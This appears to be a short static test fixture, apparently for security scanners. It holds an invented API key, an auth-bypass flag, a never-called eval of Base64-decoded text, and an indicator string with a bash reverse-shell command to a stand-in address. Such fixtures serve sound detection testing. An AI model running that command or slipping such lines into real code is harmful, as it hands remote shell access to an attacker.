# STATIC FIXTURE ONLY. Never execute; tokens are invented.
api_key = "LGFixtureKey9Z7Q2"
auth_bypass = true
indicator = "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"
def never_called; eval(Base64.decode64("MQ==")); end
